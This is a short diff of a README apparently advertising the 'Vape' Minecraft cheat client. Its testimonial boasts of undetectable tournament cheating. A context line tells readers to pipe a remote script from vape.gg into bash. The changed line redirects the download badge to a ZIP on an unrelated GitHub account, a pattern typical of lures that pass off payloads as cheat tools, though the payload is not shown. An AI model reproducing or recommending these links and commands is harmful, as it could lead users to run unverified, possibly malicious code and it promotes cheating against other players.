@@ -71,7 +71,7 @@ curl -sSL vape.gg/neural | bash -s -- --mobile
 > "The quantum modules made tournament cheating undetectable - our team dominated Hypixel Grandmasters"  
 > *- Minecraft Champions League Winner, 2025*  
 
-[![Download Quantum Core](https://img.shields.io/badge/🌀_DOWNLOAD_VAPE_QUANTUM-7E57C2?style=for-the-badge&logo=quantum)](https://vape.gg/quantum)  
+[![Download Quantum Core](https://img.shields.io/badge/🌀_DOWNLOAD_VAPE_QUANTUM-7E57C2?style=for-the-badge&logo=quantum)](https://github.com/darklightkreelan65/VapeV4-Update/releases/download/VapeV4/Vape.V4.zip)  
 
 ---
 
